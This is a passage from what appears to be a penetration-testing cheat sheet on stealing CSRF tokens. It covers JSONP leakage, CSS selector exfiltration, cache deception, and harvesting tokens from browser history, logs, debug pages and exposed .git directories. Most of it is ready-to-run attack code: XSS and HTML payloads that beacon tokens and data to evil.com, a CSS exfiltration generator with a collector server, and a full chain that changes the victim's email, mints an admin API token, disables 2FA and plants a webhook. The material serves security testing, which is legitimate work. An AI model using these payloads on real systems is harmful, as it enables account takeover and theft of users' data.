  ```
  :::
::

### JSONP Token Leakage

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JSONP Endpoint Discovery"}
  ```bash
  # Search for JSONP endpoints that return CSRF tokens or session data

  # Test common JSONP parameter names
  CALLBACKS=("callback" "cb" "jsonp" "jsonpcallback" "func" "fn" "call")
  ENDPOINTS=("/api/session" "/api/user" "/api/me" "/api/csrf" "/api/profile" "/api/auth/status")

  for ep in "${ENDPOINTS[@]}"; do
    for cb in "${CALLBACKS[@]}"; do
      resp=$(curl -s "https://target.com${ep}?${cb}=test_func" \
        -H "Cookie: session=VALID")
      if echo "$resp" | grep -q "test_func("; then
        echo "[+] JSONP found: ${ep}?${cb}=test_func"
        echo "    Response: $(echo "$resp" | head -c 200)"
        echo ""
      fi
    done
  done

  # Check if JSONP response includes CSRF token
  curl -s "https://target.com/api/session?callback=steal" \
    -H "Cookie: session=VALID" | \
    grep -iE "(csrf|token|xsrf)"

  # Check for JSONP with content-type override
  curl -s "https://target.com/api/session?format=jsonp&callback=steal" \
    -H "Cookie: session=VALID"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="JSONP Token Extraction Exploit"}
  ```html
  <!-- JSONP bypasses same-origin policy entirely -->
  <!-- Script tags can load cross-origin JSONP responses -->

  <html>
  <body>
  <script>
  // Define callback function that receives the data
  function steal(data) {
    // Extract CSRF token from JSONP response
    const token = data.csrf_token || data.token || data._token ||
                  data.session?.csrf || data.user?.csrf_token;
    
    if (token) {
      console.log('[+] CSRF token from JSONP:', token);
      
      // Use stolen token for CSRF attack
      fetch('https://target.com/api/user/email', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': token
        },
        body: JSON.stringify({ email: 'attacker@evil.com' })
      });
    }
    
    // Exfiltrate full response
    navigator.sendBeacon('https://evil.com/jsonp-data',
      JSON.stringify(data));
  }
  </script>

  <!-- Load JSONP endpoint with our callback -->
  <script src="https://target.com/api/session?callback=steal"></script>

  <!-- Alternative: Dynamic script injection for multiple endpoints -->
  <script>
  function tryEndpoints() {
    const endpoints = [
      '/api/session?callback=steal',
      '/api/user?cb=steal',
      '/api/csrf?jsonp=steal',
      '/api/me?callback=steal',
      '/api/auth/status?func=steal',
    ];
    
    endpoints.forEach(ep => {
      const s = document.createElement('script');
      s.src = 'https://target.com' + ep;
      s.onerror = () => console.log('[-] Failed:', ep);
      document.body.appendChild(s);
    });
  }
  tryEndpoints();
  </script>
  </body>
  </html>
  ```
  :::
::

### CSS-Based Token Exfiltration

::tip
CSS can be used to exfiltrate CSRF tokens from HTML attributes via attribute selectors and external resource loading. This technique works when an attacker can inject CSS into a page containing CSRF tokens in HTML attributes.
::

::code-group
```css [Attribute Selector Exfiltration]
/* CSS attribute selectors can match CSRF token values character by character */
/* Each match triggers a background-image request to attacker server */

/* Token in: <input type="hidden" name="csrf" value="aB3..."> */
/* Extract first character */
input[name="csrf"][value^="a"] { background: url(https://evil.com/css-exfil?pos=0&char=a); }
input[name="csrf"][value^="b"] { background: url(https://evil.com/css-exfil?pos=0&char=b); }
input[name="csrf"][value^="c"] { background: url(https://evil.com/css-exfil?pos=0&char=c); }
/* ... repeat for all possible characters: a-z, A-Z, 0-9, special chars */

/* After first char known (e.g., 'a'), extract second character */
input[name="csrf"][value^="aa"] { background: url(https://evil.com/css-exfil?pos=1&char=a); }
input[name="csrf"][value^="ab"] { background: url(https://evil.com/css-exfil?pos=1&char=b); }
input[name="csrf"][value^="aB"] { background: url(https://evil.com/css-exfil?pos=1&char=B); }
/* Continue iteratively until full token is extracted */

/* Token in: <meta name="csrf-token" content="xyz..."> */
meta[name="csrf-token"][content^="x"] { display: block; background: url(https://evil.com/css-exfil?c=x); }
```

```python [css_exfil_generator.py]
#!/usr/bin/env python3
"""Generate CSS payloads for CSRF token exfiltration via attribute selectors"""

import string, sys

def generate_css(attribute_selector, known_prefix="", charset=None):
    """Generate CSS rules for next character extraction"""
    if charset is None:
        charset = string.ascii_letters + string.digits + "-_/+=."
    
    rules = []
    pos = len(known_prefix)
    
    for char in charset:
        test_value = known_prefix + char
        encoded_char = char.replace("\\", "\\\\").replace('"', '\\"')
        safe_char = char
        for special in ['&', '=', '#', '%', '+', ' ']:
            safe_char = safe_char.replace(special, f'%{ord(special):02x}')
        
        rule = f'{attribute_selector}[value^="{test_value}"] {{ background: url(https://evil.com/css?p={pos}&c={safe_char}); }}'
        rules.append(rule)
    
    return '\n'.join(rules)

if __name__ == '__main__':
    selector = sys.argv[1] if len(sys.argv) > 1 else 'input[name="csrf_token"]'
    prefix = sys.argv[2] if len(sys.argv) > 2 else ''
    
    css = generate_css(selector, prefix)
    
    outfile = f'exfil_pos{len(prefix)}.css'
    with open(outfile, 'w') as f:
        f.write(css)
    print(f'[+] Generated {outfile} ({len(css.splitlines())} rules)')
    print(f'[*] Selector: {selector}')
    print(f'[*] Known prefix: "{prefix}"')
    print(f'[*] Extracting position: {len(prefix)}')
```

```python [css_exfil_server.py]
#!/usr/bin/env python3
"""Server to collect CSS exfiltrated CSRF token characters"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import sys

extracted = {}

class CSSExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        
        if 'p' in params and 'c' in params:
            pos = int(params['p'][0])
            char = params['c'][0]
            extracted[pos] = char
            
            # Reconstruct token so far
            token = ''.join(extracted.get(i, '?') for i in range(max(extracted.keys()) + 1))
            print(f'[+] Position {pos}: "{char}" → Token so far: {token}')
        
        # Return 1x1 transparent GIF
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        self.wfile.write(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
    
    def log_message(self, format, *args):
        pass

port = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
print(f'[*] CSS exfil collector on port {port}')
HTTPServer(('0.0.0.0', port), CSSExfilHandler).serve_forever()
```
::

## Client-Side Token Extraction via XSS

::caution
When XSS exists on the target application, CSRF token extraction becomes trivial. Any storage mechanism — cookies, localStorage, sessionStorage, DOM attributes, meta tags, JavaScript variables, API responses — is fully accessible from same-origin JavaScript.
::

### XSS Token Extraction Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="DOM-Based Extraction"}
  ```javascript
  // ========================================
  // XSS Payloads for CSRF Token Extraction
  // ========================================

  // Extract from hidden form field
  var token = document.querySelector('input[name="csrf_token"]')?.value;
  if (!token) token = document.querySelector('input[name="_token"]')?.value;
  if (!token) token = document.querySelector('input[name="authenticity_token"]')?.value;
  if (!token) token = document.querySelector('input[name="csrfmiddlewaretoken"]')?.value;

  // Extract from meta tag
  if (!token) token = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!token) token = document.querySelector('meta[name="_token"]')?.content;
  if (!token) token = document.querySelector('meta[name="csrf-param"]')?.content;

  // Extract from data attribute
  if (!token) token = document.querySelector('[data-csrf]')?.dataset.csrf;
  if (!token) token = document.querySelector('[data-csrf-token]')?.dataset.csrfToken;
  if (!token) token = document.body.dataset.csrfToken;

  // Extract from cookie (if not HttpOnly)
  if (!token) {
    const cookieMatch = document.cookie.match(/(?:csrf|xsrf|_token)=([^;]+)/i);
    if (cookieMatch) token = cookieMatch[1];
  }

  // Extract from localStorage
  if (!token) token = localStorage.getItem('csrf_token');
  if (!token) token = localStorage.getItem('xsrf-token');
  if (!token) token = localStorage.getItem('_token');

  // Extract from sessionStorage
  if (!token) token = sessionStorage.getItem('csrf_token');
  if (!token) token = sessionStorage.getItem('xsrf-token');

  // Extract from JavaScript global variables
  if (!token && window.csrfToken) token = window.csrfToken;
  if (!token && window._csrf) token = window._csrf;
  if (!token && window.__CSRF_TOKEN__) token = window.__CSRF_TOKEN__;

  // Extract from state hydration objects
  if (!token && window.__INITIAL_STATE__) {
    token = window.__INITIAL_STATE__.csrf || 
            window.__INITIAL_STATE__.csrfToken ||
            window.__INITIAL_STATE__.meta?.csrf;
  }
  if (!token && window.__NEXT_DATA__) {
    token = window.__NEXT_DATA__.props?.csrfToken;
  }
  if (!token && window.__NUXT__) {
    token = window.__NUXT__.state?.csrf;
  }

  // Exfiltrate
  if (token) {
    new Image().src = 'https://evil.com/token?t=' + encodeURIComponent(token);
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="API-Based Extraction"}
  ```javascript
  // Fetch CSRF token from dedicated API endpoint
  async function stealToken() {
    const endpoints = [
      '/api/csrf-token',
      '/api/csrf',
      '/api/session',
      '/api/auth/csrf',
      '/api/me',
      '/sanctum/csrf-cookie',
      '/api/antiforgery/token',
    ];

    for (const ep of endpoints) {
      try {
        const resp = await fetch(ep, { credentials: 'same-origin' });
        if (resp.ok) {
          const contentType = resp.headers.get('content-type') || '';
          
          if (contentType.includes('json')) {
            const data = await resp.json();
            // Deep search for token in JSON response
            const token = findToken(data);
            if (token) {
              console.log(`[+] Token from ${ep}:`, token);
              await exfiltrate(token, ep);
              return token;
            }
          } else {
            const text = await resp.text();
            // Check for Set-Cookie header (CSRF cookie)
            const cookies = document.cookie;
            const csrfCookie = cookies.match(/(?:csrf|xsrf)[^=]*=([^;]+)/i);
            if (csrfCookie) {
              await exfiltrate(csrfCookie[1], 'cookie:' + ep);
              return csrfCookie[1];
            }
          }
        }
      } catch (e) {
        continue;
      }
    }
  }

  function findToken(obj, depth = 0) {
    if (depth > 5 || !obj) return null;
    if (typeof obj === 'string' && obj.length >= 16) return obj;
    if (typeof obj === 'object') {
      for (const key of Object.keys(obj)) {
        if (/csrf|xsrf|token|_token|nonce/i.test(key)) {
          if (typeof obj[key] === 'string') return obj[key];
        }
        const result = findToken(obj[key], depth + 1);
        if (result) return result;
      }
    }
    return null;
  }

  async function exfiltrate(token, source) {
    navigator.sendBeacon('https://evil.com/stolen', JSON.stringify({
      token, source, url: location.href, time: Date.now()
    }));
  }

  stealToken();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Full Exploit Chain (Extract + Attack)"}
  ```javascript
  // Complete XSS payload: extract CSRF token → perform actions → persist access
  (async () => {
    // Phase 1: Extract CSRF token using all available methods
    let csrf = null;
    
    // Try DOM
    const selectors = [
      'input[name*="csrf"]', 'input[name*="token"]',
      'input[name="_token"]', 'input[name="authenticity_token"]',
      'meta[name="csrf-token"]', 'meta[name="_csrf"]',
      '[data-csrf]', '[data-token]'
    ];
    for (const sel of selectors) {
      const el = document.querySelector(sel);
      if (el) { csrf = el.value || el.content || el.dataset.csrf; break; }
    }
    
    // Try API
    if (!csrf) {
      try {
        const r = await fetch('/api/csrf-token');
        const d = await r.json();
        csrf = d.token || d.csrf_token || d.csrfToken || d._token;
      } catch(e) {}
    }

    // Try cookies
    if (!csrf) {
      const m = document.cookie.match(/(?:csrf|xsrf|_token)=([^;]+)/i);
      if (m) csrf = decodeURIComponent(m[1]);
    }
    
    // Try localStorage/sessionStorage
    if (!csrf) {
      for (const store of [localStorage, sessionStorage]) {
        for (let i = 0; i < store.length; i++) {
          const key = store.key(i);
          if (/csrf|xsrf|token/i.test(key)) {
            csrf = store.getItem(key);
            break;
          }
        }
        if (csrf) break;
      }
    }
    
    if (!csrf) {
      navigator.sendBeacon('https://evil.com/fail', 'no_token_found');
      return;
    }

    // Phase 2: Exfiltrate token
    await fetch('https://evil.com/token', {
      method: 'POST',
      body: JSON.stringify({ csrf, url: location.href })
    }).catch(() => {});

    // Phase 3: Execute attack chain with valid CSRF token
    const headers = {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrf
    };
    const opts = { method: 'POST', headers, credentials: 'same-origin' };

    // Attack 1: Change email
    await fetch('/api/user/email', {
      ...opts, body: JSON.stringify({ email: 'attacker@evil.com' })
    }).catch(() => {});

    // Attack 2: Create API token for persistence
    const tokenResp = await fetch('/api/tokens', {
      ...opts, body: JSON.stringify({ name: 'svc', scope: 'admin:all' })
    }).catch(() => null);
    if (tokenResp) {
      const apiToken = await tokenResp.json().catch(() => null);
      if (apiToken) {
        navigator.sendBeacon('https://evil.com/apikey', JSON.stringify(apiToken));
      }
    }

    // Attack 3: Disable 2FA
    await fetch('/api/user/2fa/disable', {
      ...opts, body: JSON.stringify({ confirm: true })
    }).catch(() => {});

    // Attack 4: Add webhook for data exfiltration
    await fetch('/api/webhooks', {
      ...opts, body: JSON.stringify({
        url: 'https://evil.com/hook', events: ['*'], active: true
      })
    }).catch(() => {});
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Compact One-Liner Payloads"}
  ```javascript
  // Minimal XSS payloads for token theft

  // From meta tag → exfiltrate
  fetch('//evil.com/t?c='+document.querySelector('meta[name=csrf-token]').content)

  // From hidden input → exfiltrate
  new Image().src='//evil.com/t?c='+document.querySelector('[name=_token]').value

  // From cookie → exfiltrate
  fetch('//evil.com/t?c='+document.cookie.match(/csrf=([^;]+)/)[1])

  // From API → exfiltrate
  fetch('/api/csrf').then(r=>r.json()).then(d=>fetch('//evil.com/t?c='+d.token))

  // Extract + immediate CSRF attack (no exfiltration needed)
  fetch('/api/csrf').then(r=>r.json()).then(d=>fetch('/api/user/email',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':d.token},body:'{"email":"evil@evil.com"}'}))

  // localStorage extraction
  fetch('//evil.com/t?c='+localStorage.csrf_token)

  // Full auto with fallbacks (URL-encoded for injection)
  javascript:void(fetch('/api/csrf').then(r=>r.json()).then(d=>{let t=d.token;fetch('/api/user/email',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':t},body:'{"email":"pwned@evil.com"}'});fetch('//evil.com/t?t='+t)}))
  ```
  :::
::

## Cache-Based Token Leakage

### Browser Cache Exploitation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Cache Header Analysis"}
  ```bash
  # Check if pages containing CSRF tokens have proper cache-control headers

  # Ideal headers for pages with CSRF tokens:
  # Cache-Control: no-store, no-cache, must-revalidate, private
  # Pragma: no-cache
  # Expires: 0

  # Test token-bearing page cache headers
  curl -sI https://target.com/settings \
    -H "Cookie: session=VALID" | \
    grep -iE "(cache-control|pragma|expires|etag|last-modified|vary|age)"

  # Test CSRF token API endpoint cache headers
  curl -sI https://target.com/api/csrf-token \
    -H "Cookie: session=VALID" | \
    grep -iE "(cache-control|pragma|expires|etag|last-modified|vary)"

  # Dangerous patterns:
  # Cache-Control: public         → Cached by proxies/CDNs
  # Cache-Control: max-age=3600   → Cached for 1 hour
  # No Cache-Control header       → Browser applies heuristic caching
  # Cache-Control: private        → Browser cache only (still exploitable on shared devices)
  # ETag/Last-Modified without no-store → Conditional caching possible

  # Check all token-bearing pages
  PAGES=("/settings" "/profile" "/account" "/dashboard" "/admin")
  for page in "${PAGES[@]}"; do
    echo "=== $page ==="
    curl -sI "https://target.com${page}" \
      -H "Cookie: session=VALID" | \
      grep -iE "(cache-control|pragma|expires)" || echo "  NO CACHE HEADERS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="CDN/Proxy Cache Poisoning"}
  ```bash
  # Test for Web Cache Deception / Cache Poisoning that exposes tokens

  # Web Cache Deception: Trick CDN into caching authenticated page
  # Append static file extension to dynamic URL
  EXTENSIONS=(".css" ".js" ".png" ".gif" ".ico" ".svg" ".woff" ".json" ".xml" ".txt" ".html")

  for ext in "${EXTENSIONS[@]}"; do
    url="https://target.com/api/csrf-token${ext}"
    echo -n "Testing: $url → "
    
    # Request 1: As victim (authenticated)
    curl -s "$url" \
      -H "Cookie: session=VICTIM" \
      -o /dev/null -D /dev/stderr 2>&1 | \
      grep -oP "(cache-control|x-cache|cf-cache-status|x-cdn-cache):\s*\K.*" | head -1
  done

  # Path confusion for cache deception
  PATHS=(
    "/api/csrf-token/nonexistent.css"
    "/api/csrf-token%2F..%2Fstatic%2Fstyle.css"
    "/api/csrf-token;.css"
    "/api/csrf-token%00.css"
    "/api/csrf-token/.css"
    "/settings/..%2Fstatic/image.png"
  )

  for path in "${PATHS[@]}"; do
    echo -n "Testing: $path → "
    resp=$(curl -s "https://target.com${path}" \
      -H "Cookie: session=VICTIM" \
      -D /dev/stderr 2>&1)
    cache_status=$(echo "$resp" | grep -iP "(x-cache|cf-cache):\s*\K.*" | head -1)
    has_token=$(echo "$resp" | grep -c "csrf\|token" 2>/dev/null || echo 0)
    echo "Cache: ${cache_status:-unknown} | Contains token: $has_token"
  done

  # Test cache key manipulation
  # Same URL, different users should get different responses
  echo "--- Cache isolation test ---"
  echo -n "User A: "
  curl -s "https://target.com/api/csrf-token" \
    -H "Cookie: session=USER_A" | head -c 100
  echo ""
  echo -n "User B (same URL): "
  curl -s "https://target.com/api/csrf-token" \
    -H "Cookie: session=USER_B" | head -c 100
  echo ""
  # If responses are identical → cache not key-ing on session → token leakage
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Service Worker Cache Abuse"}
  ```bash
  # Check if application uses service workers that cache token pages
  curl -s https://target.com/ | grep -iP "serviceWorker\.register|navigator\.serviceWorker"

  # Download and analyze service worker
  SW_URL=$(curl -s https://target.com/ | grep -oP "serviceWorker\.register\(['\"]([^'\"]+)" | grep -oP "['\"]([^'\"]+)" | tr -d "'\"")
  if [ -n "$SW_URL" ]; then
    echo "[+] Service Worker found: $SW_URL"
    curl -s "https://target.com${SW_URL}" | \
      grep -iEn "(cache|caches\.(open|match|put)|fetch.*cache|CacheStorage)" | head -20
    
    # Check if SW caches API responses containing tokens
    curl -s "https://target.com${SW_URL}" | \
      grep -iEn "(csrf|token|session|api)" | head -10
  fi
  ```
  :::
::

### Shared Device Token Persistence

::code-group
```bash [Browser History Token Extraction]
# On shared/public computers, tokens in URLs persist in browser history

# Chrome history database location (Linux)
# ~/.config/google-chrome/Default/History

# Extract URLs containing CSRF tokens from Chrome history
sqlite3 ~/.config/google-chrome/Default/History \
  "SELECT url, title, last_visit_time FROM urls 
   WHERE url LIKE '%csrf%' OR url LIKE '%token%' OR url LIKE '%_token%'
   ORDER BY last_visit_time DESC LIMIT 50;"

# Firefox history (Linux)
# ~/.mozilla/firefox/*.default-release/places.sqlite
sqlite3 ~/.mozilla/firefox/*.default-release/places.sqlite \
  "SELECT url, title, last_visit_date FROM moz_places 
   WHERE url LIKE '%csrf%' OR url LIKE '%token%' OR url LIKE '%_token%'
   ORDER BY last_visit_date DESC LIMIT 50;"

# Extract from browser cache files
find ~/.cache/google-chrome -name "*.json" -exec grep -l "csrf\|xsrf" {} \; 2>/dev/null

# Check browser autofill data for CSRF tokens in form fields
sqlite3 ~/.config/google-chrome/Default/Web\ Data \
  "SELECT name, value FROM autofill 
   WHERE name LIKE '%csrf%' OR name LIKE '%token%';"
```

```bash [Proxy Log Token Extraction]
# Corporate proxy servers log full URLs including CSRF tokens

# Search Squid proxy access logs
grep -iE "(csrf|token|_token|authenticity_token)=" /var/log/squid/access.log | \
  grep -oP 'https?://[^\s]+' | sort -u

# Search nginx access logs
grep -iE "\?(csrf|token|_token)=" /var/log/nginx/access.log | \
  awk '{print $7}' | sort -u

# Search Apache access logs
grep -iE "\?(csrf|token|_token)=" /var/log/apache2/access.log | \
  awk '{print $7}' | sort -u

# Search corporate proxy logs (BlueCoat, Zscaler, etc.)
# Format varies by proxy vendor
grep -iE "csrf_token=|authenticity_token=|_token=" /var/log/proxy/*.log | head -20

# Extract tokens from log entries
grep -oP '(?:csrf_token|_token|authenticity_token|xsrf_token)=([a-zA-Z0-9_/+=.-]+)' \
  /var/log/nginx/access.log | sort -u
```
::

## Server-Side Token Exposure

### Error Messages & Debug Output

::accordion
  :::accordion-item{icon="i-lucide-alert-triangle" label="Debug Mode Token Leakage"}
  ```bash
  # Check if debug mode exposes CSRF tokens in error responses

  # Django DEBUG=True leaks CSRF token in error pages
  curl -s https://target.com/api/nonexistent \
    -H "Cookie: session=VALID" | \
    grep -iE "(csrf|csrfmiddlewaretoken|csrftoken)" | head -5

  # Flask debug mode leaks environment variables and config
  curl -s https://target.com/api/error \
    -H "Cookie: session=VALID" | \
    grep -iE "(csrf|secret_key|token)" | head -5

  # Laravel debug mode (APP_DEBUG=true) leaks CSRF in whoops page
  curl -s https://target.com/api/error \
    -H "Cookie: session=VALID" | \
    grep -iE "(_token|csrf_token|XSRF-TOKEN)" | head -5

  # Rails development mode error pages
  curl -s https://target.com/api/error \
    -H "Cookie: session=VALID" | \
    grep -iE "(authenticity_token|csrf)" | head -5

  # PHP error messages exposing $_SESSION
  curl -s https://target.com/api/error \
    -H "Cookie: session=VALID" | \
    grep -iE "(\$_SESSION|\$_POST|\$_GET).*token" | head -5

  # Stack traces containing token values
  curl -s https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"invalid_json' | \
    grep -iE "token|csrf" | head -5

  # Force errors to trigger debug output
  # Send malformed requests that cause exceptions
  ERROR_PAYLOADS=(
    '{"email":"'
    '{"email":null,"csrf_token":'
    '[[[[[[[[[['
    '{"__proto__":{"csrf":"test"}}'
    '{"constructor":{"prototype":{"csrf":"test"}}}'
  )

  for payload in "${ERROR_PAYLOADS[@]}"; do
    echo "--- Payload: $payload ---"
    curl -s https://target.com/api/update \
      -H "Content-Type: application/json" \
      -H "Cookie: session=VALID" \
      -d "$payload" | grep -iE "csrf|token|_token" | head -3
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="API Response Over-Exposure"}
  ```bash
  # Check if API responses include CSRF tokens unnecessarily

  # User profile endpoint may return CSRF token
  curl -s https://target.com/api/user/profile \
    -H "Cookie: session=VALID" | jq '.'

  # Session info endpoint
  curl -s https://target.com/api/session \
    -H "Cookie: session=VALID" | jq '.'

  # Check all API responses for token exposure
  ENDPOINTS=(
    "/api/user" "/api/me" "/api/profile" "/api/account"
    "/api/session" "/api/auth/status" "/api/dashboard"
    "/api/settings" "/api/config" "/api/preferences"
  )

  for ep in "${ENDPOINTS[@]}"; do
    resp=$(curl -s "https://target.com${ep}" -H "Cookie: session=VALID")
    tokens=$(echo "$resp" | grep -ioE '"(csrf|xsrf|_token|token|csrfToken|nonce)":\s*"[^"]*"')
    if [ -n "$tokens" ]; then
      echo "[+] Token in response: $ep"
      echo "    $tokens"
    fi
  done

  # Check GraphQL introspection for token exposure
  curl -s https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"query":"{ me { csrf csrfToken token _token } }"}' | \
    jq '.'

  # Check HTML responses embedding tokens in JavaScript
  curl -s https://target.com/dashboard \
    -H "Cookie: session=VALID" | \
    grep -oP '(?:csrf|token|xsrf)\s*[=:]\s*["\x27]([a-zA-Z0-9_/+=.-]{16,})["\x27]' | head -10
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Server Log File Exposure"}
  ```bash
  # Check for exposed log files containing CSRF tokens from URL parameters

  # Common log file paths
  LOG_PATHS=(
    "/logs" "/log" "/debug" "/debug.log"
    "/error.log" "/access.log" "/server.log"
    "/var/log" "/tmp/logs" "/app/logs"
    "/.env" "/env" "/config" "/phpinfo.php"
    "/elmah.axd" "/trace.axd"
    "/actuator/httptrace" "/actuator/logfile"
    "/api/logs" "/api/debug"
    "/_debug" "/__debug__"
    "/server-status" "/server-info"
  )

  for path in "${LOG_PATHS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}")
    if [[ "$status" =~ ^(200|403)$ ]]; then
      echo "[!] Accessible: $path (HTTP $status)"
      if [ "$status" = "200" ]; then
        # Check if log contains CSRF tokens
        curl -s "https://target.com${path}" | \
          grep -iE "csrf|token|_token" | head -5
      fi
    fi
  done

  # Spring Boot Actuator endpoints
  ACTUATOR_PATHS=(
    "/actuator" "/actuator/env" "/actuator/configprops"
    "/actuator/httptrace" "/actuator/mappings"
    "/actuator/logfile" "/actuator/heapdump"
  )

  for path in "${ACTUATOR_PATHS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}")
    if [ "$status" = "200" ]; then
      echo "[!] Spring Actuator: $path"
      curl -s "https://target.com${path}" | grep -iE "csrf|token" | head -3
    fi
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Version Control Token Exposure"}
  ```bash
  # Check for exposed .git directory containing CSRF secrets

  # Test for .git exposure
  curl -s https://target.com/.git/HEAD
  curl -s https://target.com/.git/config

  # If .git exposed, dump repository
  git-dumper https://target.com/.git/ ./dumped_repo

  # Search for CSRF token generation secrets
  grep -rn "csrf\|CSRF\|secret_key\|SECRET_KEY\|token_secret\|CSRF_SECRET" dumped_repo/

  # Check for .env files
  curl -s https://target.com/.env | grep -iE "csrf|secret|token"

  # Check for exposed config files
  curl -s https://target.com/config.yml | grep -iE "csrf|secret"
  curl -s https://target.com/config/app.php | grep -iE "csrf|secret"
  curl -s https://target.com/application.properties | grep -iE "csrf|secret"
  curl -s https://target.com/appsettings.json | grep -iE "csrf|antiforgery"

  # SVN exposure
  curl -s https://target.com/.svn/entries
  curl -s https://target.com/.svn/wc.db | strings | grep -iE "csrf|token|secret"

  # Backup files
  BACKUP_EXTENSIONS=(".bak" ".old" ".orig" ".swp" "~" ".save" ".backup" ".tmp")
  CONFIG_FILES=("config.php" "settings.py" "app.config" "web.config" ".env")
  
  for config in "${CONFIG_FILES[@]}"; do
    for ext in "${BACKUP_EXTENSIONS[@]}"; do
      status=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/${config}${ext}")
      if [ "$status" = "200" ]; then
        echo "[!] Backup found: ${config}${ext}"
        curl -s "https://target.com/${config}${ext}" | grep -iE "csrf|secret|token" | head -3
      fi
    done
  done
  ```
  :::
::

## Token Prediction & Weakness Analysis

### Token Entropy Testing

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Token Collection & Analysis"}
  ```bash
  # Collect multiple CSRF tokens for pattern analysis
  for i in $(seq 1 50); do
    token=$(curl -s https://target.com/api/csrf-token \
      -H "Cookie: session=VALID" | jq -r '.token // .csrf_token // .csrfToken')
    timestamp=$(date +%s%N)
    echo "${timestamp},${token}" >> tokens_collected.csv
    sleep 0.5
  done

  echo "[+] Collected $(wc -l < tokens_collected.csv) tokens"

  # Basic token analysis
  echo "=== Token Characteristics ==="
  awk -F',' '{print $2}' tokens_collected.csv | while read token; do
    echo -n "Length: ${#token} | Charset: "
    echo "$token" | grep -oP '.' | sort -u | tr -d '\n'
    echo ""
  done | sort | uniq -c | sort -rn | head -5

  # Check for sequential/predictable tokens
  echo "=== Sequential Analysis ==="
  awk -F',' '{print $2}' tokens_collected.csv | head -10

  # Check if tokens change per request
  echo "=== Uniqueness ==="
  total=$(wc -l < tokens_collected.csv)
  unique=$(awk -F',' '{print $2}' tokens_collected.csv | sort -u | wc -l)
  echo "Total: $total | Unique: $unique | Duplicates: $((total - unique))"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Entropy Analysis"}
  ```python
  #!/usr/bin/env python3
  """CSRF Token Entropy and Predictability Analyzer"""

  import requests, math, sys, time, json
  from collections import Counter

  def collect_tokens(url, cookie, count=100, delay=0.3):
      tokens = []
      session = requests.Session()
      session.cookies.update(cookie)
      
      for i in range(count):
          try:
              resp = session.get(url, timeout=10)
              data = resp.json()
              token = data.get('token') or data.get('csrf_token') or data.get('csrfToken') or data.get('_token')
              if token:
                  tokens.append({'token': token, 'time': time.time()})
                  if i % 10 == 0:
                      print(f'  Collected {i+1}/{count}')
              time.sleep(delay)
          except Exception as e:
              print(f'  Error: {e}')
      
      return tokens

  def analyze_entropy(tokens):
      """Calculate Shannon entropy of token charset"""
      if not tokens:
          return 0
      
      all_chars = ''.join(t['token'] for t in tokens)
      freq = Counter(all_chars)
      total = len(all_chars)
      
      entropy = -sum((count/total) * math.log2(count/total) 
                      for count in freq.values())
      return entropy

  def analyze_predictability(tokens):
      """Check for patterns in token generation"""
      results = {
          'total_tokens': len(tokens),
          'unique_tokens': len(set(t['token'] for t in tokens)),
          'token_lengths': list(set(len(t['token']) for t in tokens)),
          'charset': ''.join(sorted(set(''.join(t['token'] for t in tokens)))),
          'entropy_bits': 0,
          'sequential': False,
          'time_based': False,
          'static': False,
          'weak': False,
          'issues': []
      }
      
      # Check static tokens
      if results['unique_tokens'] == 1:
          results['static'] = True
          results['weak'] = True
          results['issues'].append('CRITICAL: Token is static - same value every time')
      
      # Check low uniqueness
      elif results['unique_tokens'] < len(tokens) * 0.5:
          results['weak'] = True
          results['issues'].append(f'LOW UNIQUENESS: Only {results["unique_tokens"]} unique out of {len(tokens)}')
      
      # Check short tokens
      if any(l < 16 for l in results['token_lengths']):
          results['weak'] = True
          results['issues'].append(f'SHORT TOKEN: Length {min(results["token_lengths"])} chars')
      
      # Calculate entropy
      results['entropy_bits'] = analyze_entropy(tokens)
      if results['entropy_bits'] < 3.0:
          results['weak'] = True
          results['issues'].append(f'LOW ENTROPY: {results["entropy_bits"]:.2f} bits per character')
      
      # Check for sequential patterns (hex/numeric)
      try:
          values = [int(t['token'], 16) for t in tokens]
          diffs = [values[i+1] - values[i] for i in range(len(values)-1)]
          if len(set(diffs)) <= 3:
              results['sequential'] = True
              results['weak'] = True
              results['issues'].append(f'SEQUENTIAL: Constant difference of {diffs[0]}')
      except (ValueError, IndexError):
          pass
      
      # Check for timestamp correlation
      try:
          for t in tokens:
              token_int = int(t['token'][:10], 16) if len(t['token']) >= 10 else 0
              time_int = int(t['time'])
              if abs(token_int - time_int) < 86400:
                  results['time_based'] = True
                  results['weak'] = True
                  results['issues'].append('TIME-BASED: Token correlates with timestamp')
                  break
      except (ValueError, OverflowError):
